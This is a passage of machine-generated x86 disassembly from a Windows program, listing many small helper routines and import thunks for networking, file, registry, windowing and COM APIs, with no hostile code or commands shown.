mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_423eb0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_423ed0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_423ef0
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_423f00
mov eax [ ecx + 0x4 ]
retn
sub_423f10
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_423f20
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_423f30
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423f40
mov eax [ ecx ]
add eax 0xc
retn
sub_423f50
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423f60
mov eax [ ecx ]
add eax 0xc
retn
sub_423f70
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_423f80
mov eax [ ecx + 0x4 ]
retn
sub_423f90
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423fa0
mov eax [ ecx ]
add eax 0xc
retn
sub_424000
retn 0x4
sub_424010
mov eax 0x3fffffff
retn
sub_4240e0
retn 0x4
sub_4240f0
mov eax ecx
mov [ eax ] 0x0
retn
sub_424150
mov eax ecx
mov [ eax ] 0x0
retn
sub_424160
mov eax 0x6666666
retn
sub_424220
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_424300
push esi
mov esi ecx
call sub_423ae0
mov eax esi
pop esi
retn
sub_424370
mov eax 0x4924924
retn
sub_424380
mov eax [ esp + 0x4 ]
retn 0x4
sub_424440
retn 0x4
sub_424450
push esi
mov esi ecx
call sub_423b90
mov eax esi
pop esi
retn
sub_4244c0
mov eax ecx
retn 0x8
sub_4244d0
mov eax [ esp + 0x4 ]
imul eax eax 0x38
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_4244f0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_424510
mov eax ecx
retn 0x8
sub_424520
retn 0x4
sub_424530
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_424550
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x3
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_4245e0
mov eax ecx
retn 0x8
sub_4245f0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_424610
push esi
mov esi ecx
call sub_423de0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_424630
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_424640
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_424650
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_424660
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_424670
mov eax [ ecx ]
add eax 0xc
retn
sub_424680
mov eax [ ecx ]
add eax 0xc
retn
sub_424690
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4246a0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4246b0
mov eax [ ecx ]
add eax 0xc
retn
sub_4246c0
mov eax [ esp + 0x8 ]
push eax
call sub_423fb0
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_4246e0
mov eax [ esp + 0x8 ]
push eax
call sub_424100
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_424700
mov eax [ esp + 0x8 ]
push eax
call sub_423fb0
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_424720
mov eax [ esp + 0x8 ]
push eax
call sub_4241d0
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_4247c4
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_4247e0
push esi
mov esi ecx
call sub_4242a0
mov eax esi
pop esi
retn
sub_4247f0
push esi
mov esi ecx
call sub_424240
mov eax esi
pop esi
retn
sub_424800
push esi
mov esi ecx
call sub_423ae0
mov eax esi
pop esi
retn
sub_424810
push esi
mov esi ecx
call sub_424310
mov eax esi
pop esi
retn
sub_424820
mov eax [ esp + 0x8 ]
push eax
call sub_424100
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_424840
mov eax [ esp + 0x8 ]
push eax
call sub_4243f0
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_424860
push esi
mov esi ecx
call sub_423b90
mov eax esi
pop esi
retn
sub_424870
push esi
mov esi ecx
call sub_424460
mov eax esi
pop esi
retn
sub_42490a
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_4249ba
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_424a64
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_424b4a
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_424b70
mov ecx [ esp + 0x4 ]
jmp sub_423de0
sub_424db0
push esi
mov esi ecx
call sub_4242a0
mov eax esi
pop esi
retn
sub_424dc0
push esi
mov esi ecx
call sub_424240
mov eax esi
pop esi
retn
sub_424dd0
push esi
mov esi ecx
call sub_424310
mov eax esi
pop esi
retn
sub_424e10
push esi
mov esi ecx
call sub_424460
mov eax esi
pop esi
retn
sub_424e50
mov eax ecx
retn 0x8
sub_424e90
mov eax ecx
retn 0x8
sub_425340
mov eax ecx
retn 0x8
sub_425350
mov ecx [ esp + 0x4 ]
call sub_423de0
retn 0x4
sub_4254e0
push esi
mov esi [ ecx ]
call sub_4242a0
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_425500
push esi
mov esi [ ecx ]
call sub_424310
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_425560
push esi
mov esi [ ecx ]
call sub_424460
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_425ad0
sub esp 0x8
lea eax [ esp + 0xc ]
push eax
lea edx [ esp + 0x4 ]
push edx
add ecx 0x2c
call sub_425420
add esp 0x8
retn 0x4
sub_425daf
mov edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x18 ]
call sub_425a90
push 0x0
push 0x0
call _CxxThrowException
sub_426198
mov ecx [ ebp - 0x14 ]
call sub_4260c0
push 0x0
push 0x0
call _CxxThrowException
sub_426480
push esi
mov esi ecx
call sub_426370
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_426524
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_426540
mov ecx [ esp + 0x4 ]
jmp sub_426370
sub_4266f0
mov ecx [ esp + 0x4 ]
call sub_426370
retn 0x4
sub_427d10
push esi
mov esi ecx
call sub_4279a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_427e20
retn
sub_427f60
mov ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
setne al
retn
sub_4287b0
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
xor edx edx
div [ esp + 0x4 ]
mov eax edx
retn
sub_428910
mov eax ecx
mov ecx [ esp + 0x4 ]
lea edx [ ecx + ecx ]
add [ eax ] edx
retn 0x4
sub_428d00
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ eax ]
neg ecx
shl ecx 0x1
add edx ecx
mov [ eax ] edx
retn 0x4
sub_428d20
mov eax [ esp + 0x8 ]
mov ecx [ ecx ]
lea edx [ eax + eax ]
mov eax [ esp + 0x4 ]
sub ecx edx
mov [ eax ] ecx
retn 0x8
sub_428fd0
mov ecx [ esp + 0x4 ]
push 0x0
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
setne al
retn
sub_429900
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov al 0x1
retn
cmp eax 0x1
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ esp + 0x4 ]
shl al cl
retn
sub_42a3f0
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42a410
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ _atoi64@IAT ]
sub_42a430
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42a450
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ _atoi64@IAT ]
sub_42a470
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ inet_addr@IAT ]
retn
sub_42a490
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ inet_addr@IAT ]
retn
sub_42a510
mov eax [ ecx ]
retn
sub_42a520
mov eax ecx
inc [ eax ]
retn
sub_42a530
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_42a5a0
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
sub_42a5b0
push esi
mov esi ecx
call sub_42a5d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_42ab00
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42ab20
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42ab40
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42ab60
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ esp + 0x4 ] eax
jmp [ atol@IAT ]
sub_42aca0
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_42acb0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_42af70
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi ] 0x0
sub_42af90
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesW@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn 0x4
sub_42b160
cmp [ ecx ] 0x0
jne r-xdata
jmp [ ecx + 0x4 ]
xor eax eax
retn 0x8
sub_42b1c0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_42b1d0
retn
sub_42b1e0
mov eax ecx
retn
sub_42b1f0
retn
sub_42b200
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_42b210
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
call [ WSACleanup@IAT ]
mov eax 0x1
pop esi
retn
push eax
call [ CloseHandle@IAT ]
mov [ esi ] 0x0
sub_42b240
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_42b250
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_42b260
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_42b280
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi ] 0x0
sub_42b7d0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov [ esi ] 0x0
call sub_42b2a0
mov eax esi
pop esi
retn 0x4
sub_42b8b0
push esi
mov esi [ ecx ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
je r-xdata
pop esi
retn
push esi
call [ eax + 0x1c ]
j_sub_42bab0
jmp sub_42bab0
htonl
jmp [ htonl@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
gethostname
jmp [ gethostname@IAT ]
ntohs
jmp [ ntohs@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
closesocket
jmp [ closesocket@IAT ]
sendto
jmp [ sendto@IAT ]
htons
jmp [ htons@IAT ]
socket
jmp [ socket@IAT ]
VerQueryValueW
jmp [ VerQueryValueW@IAT ]
GetFileVersionInfoW
jmp [ GetFileVersionInfoW@IAT ]
GetFileVersionInfoSizeW
jmp [ GetFileVersionInfoSizeW@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
sub_42c79b
push [ esp + 0x4 ]
call [ SetLastError@IAT ]
retn
GetLastError
jmp [ GetLastError@IAT ]
sub_42ccb2
mov eax 0x1
retn
sub_42ce2c
mov [ ebp - 0x1c ] 0x0
mov eax sub_42ce39
retn
sub_42ced0
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn 0x4
sub_42cee0
mov eax [ esp + 0x4 ]
push 0x0
push eax
call [ rw-data ]
retn 0x4
sub_42d090
sub esp 0x10
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push r--data
lea edx [ esp + 0x4 ]
push edx
mov [ esp + 0x8 ] r--data
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] 0x0
call _CxxThrowException
sub_42d4d4
mov eax 0x1
retn
sub_42d8a0
mov ax [ esp + 0x4 ]
cmp ax 0xfe00
jb r-xdata
movzx eax ax
sub eax 0x7ffbfe00
retn
mov eax 0x8004ffff
retn
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
GetPrivateProfileIntW
jmp [ GetPrivateProfileIntW@IAT ]
GetPrivateProfileStringW
jmp [ GetPrivateProfileStringW@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetThreadLocale
jmp [ GetThreadLocale@IAT ]
GetVersionExW
jmp [ GetVersionExW@IAT ]
__imp_GetLastError
jmp [ GetLastError@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
Sleep
jmp [ Sleep@IAT ]
FlushInstructionCache
jmp [ FlushInstructionCache@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
CreateEventW
jmp [ CreateEventW@IAT ]
WaitForMultipleObjects
jmp [ WaitForMultipleObjects@IAT ]
DeleteTimerQueueTimer
jmp [ DeleteTimerQueueTimer@IAT ]
CreateTimerQueueTimer
jmp [ CreateTimerQueueTimer@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
SetErrorMode
jmp [ SetErrorMode@IAT ]
SetEnvironmentVariableW
jmp [ SetEnvironmentVariableW@IAT ]
GetEnvironmentVariableW
jmp [ GetEnvironmentVariableW@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
OpenMutexW
jmp [ OpenMutexW@IAT ]
TerminateThread
jmp [ TerminateThread@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
CreateMutexW
jmp [ CreateMutexW@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
FindResourceW
jmp [ FindResourceW@IAT ]
FindResourceExW
jmp [ FindResourceExW@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
GetVolumeInformationA
jmp [ GetVolumeInformationA@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
WritePrivateProfileStringA
jmp [ WritePrivateProfileStringA@IAT ]
GetPrivateProfileStringA
jmp [ GetPrivateProfileStringA@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
WritePrivateProfileStringW
jmp [ WritePrivateProfileStringW@IAT ]
GetPrivateProfileSectionW
jmp [ GetPrivateProfileSectionW@IAT ]
GetPrivateProfileSectionNamesW
jmp [ GetPrivateProfileSectionNamesW@IAT ]
GetFileAttributesW
jmp [ GetFileAttributesW@IAT ]
OutputDebugStringW
jmp [ OutputDebugStringW@IAT ]
MoveFileW
jmp [ MoveFileW@IAT ]
DeleteFileW
jmp [ DeleteFileW@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
IsBadCodePtr
jmp [ IsBadCodePtr@IAT ]
CreateDirectoryW
jmp [ CreateDirectoryW@IAT ]
lstrcatW
jmp [ lstrcatW@IAT ]
GetTempPathW
jmp [ GetTempPathW@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
FormatMessageW
jmp [ FormatMessageW@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
PostMessageW
jmp [ PostMessageW@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
TranslateAcceleratorW
jmp [ TranslateAcceleratorW@IAT ]
GetMessageW
jmp [ GetMessageW@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
SetWindowLongW
jmp [ SetWindowLongW@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
CreateWindowExW
jmp [ CreateWindowExW@IAT ]
UpdateLayeredWindow
jmp [ UpdateLayeredWindow@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
IsWindowVisible
jmp [ IsWindowVisible@IAT ]
FindWindowW
jmp [ FindWindowW@IAT ]
DefWindowProcW
jmp [ DefWindowProcW@IAT ]
GetWindowLongW
jmp [ GetWindowLongW@IAT ]
CallWindowProcW
jmp [ CallWindowProcW@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
SetWindowPos
jmp [ SetWindowPos@IAT ]
MapWindowPoints
jmp [ MapWindowPoints@IAT ]
SystemParametersInfoW
jmp [ SystemParametersInfoW@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetDesktopWindow
jmp [ GetDesktopWindow@IAT ]
MoveWindow
jmp [ MoveWindow@IAT ]
TrackMouseEvent
jmp [ TrackMouseEvent@IAT ]
PostThreadMessageW
jmp [ PostThreadMessageW@IAT ]
BitBlt
jmp [ BitBlt@IAT ]
SelectObject
jmp [ SelectObject@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateCompatibleDC
jmp [ CreateCompatibleDC@IAT ]
DeleteDC
jmp [ DeleteDC@IAT ]
DeleteObject
jmp [ DeleteObject@IAT ]
RegQueryValueExW
jmp [ RegQueryValueExW@IAT ]
RegOpenKeyExW
jmp [ RegOpenKeyExW@IAT ]
SHFileOperationW
jmp [ SHFileOperationW@IAT ]
SHGetSpecialFolderPathW
jmp [ SHGetSpecialFolderPathW@IAT ]
OleDraw
jmp [ OleDraw@IAT ]
OleRun
jmp [ OleRun@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
OleSetContainedObject
jmp [ OleSetContainedObject@IAT ]
OleCreate
jmp [ OleCreate@IAT ]
OleUninitialize
jmp [ OleUninitialize@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
SysAllocString
jmp [ SysAllocString@IAT ]
SysAllocStringByteLen
jmp [ SysAllocStringByteLen@IAT ]
SysStringByteLen
jmp [ SysStringByteLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
LoadRegTypeLib
jmp [ LoadRegTypeLib@IAT ]
LoadTypeLib
jmp [ LoadTypeLib@IAT ]
SysStringLen
jmp [ SysStringLen@IAT ]
VariantClear
jmp [ VariantClear@IAT ]
DispCallFunc
jmp [ DispCallFunc@IAT ]
VariantInit
jmp [ VariantInit@IAT ]
VariantCopy
jmp [ VariantCopy@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
SetErrorInfo
jmp [ SetErrorInfo@IAT ]
CreateErrorInfo
jmp [ CreateErrorInfo@IAT ]
Ordinal_ATL71_66
jmp [ Ordinal_ATL71_66@IAT ]
Ordinal_ATL71_65
jmp [ Ordinal_ATL71_65@IAT ]
Ordinal_ATL71_10
jmp [ Ordinal_ATL71_10@IAT ]
Ordinal_ATL71_11
jmp [ Ordinal_ATL71_11@IAT ]
Ordinal_ATL71_54
jmp [ Ordinal_ATL71_54@IAT ]
Ordinal_ATL71_58
jmp [ Ordinal_ATL71_58@IAT ]
Ordinal_ATL71_31
jmp [ Ordinal_ATL71_31@IAT ]
Ordinal_ATL71_32
jmp [ Ordinal_ATL71_32@IAT ]
Ordinal_ATL71_27
jmp [ Ordinal_ATL71_27@IAT ]
Ordinal_ATL71_28
jmp [ Ordinal_ATL71_28@IAT ]
Ordinal_ATL71_43
jmp [ Ordinal_ATL71_43@IAT ]
Ordinal_ATL71_44
jmp [ Ordinal_ATL71_44@IAT ]
Ordinal_ATL71_45
jmp [ Ordinal_ATL71_45@IAT ]
Ordinal_ATL71_42
jmp [ Ordinal_ATL71_42@IAT ]
Ordinal_ATL71_47
jmp [ Ordinal_ATL71_47@IAT ]
Ordinal_ATL71_48
jmp [ Ordinal_ATL71_48@IAT ]
Ordinal_ATL71_40
jmp [ Ordinal_ATL71_40@IAT ]
Ordinal_ATL71_64
jmp [ Ordinal_ATL71_64@IAT ]
Ordinal_ATL71_23
jmp [ Ordinal_ATL71_23@IAT ]
Ordinal_ATL71_61
jmp [ Ordinal_ATL71_61@IAT ]
sub_42dd90
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_42dd9d
mov eax [ ecx + 0x4 ]
retn
sub_42de01
mov eax ecx
mov ecx [ esp + 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn 0x4
sub_42de0e
mov eax [ esp + 0x8 ]
retn
sub_42de13
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax 0x80070057
jmp r-xdata
cmp [ eax ] 0x2c
je r-xdata
retn 0x4
and [ eax + 0x1c ] 0x0
lea ecx [ eax + 0x4 ]
call sub_412ee0
sub_42de36
mov eax [ ecx + 0x4 ]
retn
sub_42de8d
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
sub_42df05
push esi
mov esi ecx
lea ecx [ esi + 0x18 ]
call sub_401080
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov eax esi
pop esi
retn
sub_42df1f
add ecx 0x30
jmp sub_42dde4
sub_42df27
push esi
mov esi ecx
lea eax [ esi + 0x18 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x30 ]
pop esi
jmp sub_42dde4
sub_42e115
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov eax [ eax + 0x8 ]
jmp eax
sub_42e125
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
retn 0x4
sub_42e13b
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
push ecx
call [ HeapDestroy@IAT ]
sub_42e156
push [ esp + 0x4 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapAlloc@IAT ]
retn 0x4
sub_42e168
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapFree@IAT ]
sub_42e181
cmp [ esp + 0x4 ] 0x0
push [ esp + 0x8 ]
jne r-xdata
push [ esp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapReAlloc@IAT ]
mov eax [ ecx ]
call [ eax ]
jmp r-xdata
retn 0x8
sub_42e1a4
push [ esp + 0x4 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapSize@IAT ]
retn 0x4
sub_42e1b6
push esi
mov esi ecx
call sub_42e13b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_42e1d2
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0xc ] 0x2
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x10 ] cx
mov [ eax + 0x12 ] cx
retn
sub_42e1ee
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
retn 0x4
sub_42e226
mov [ ecx ] r--data
retn
sub_42e22d
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
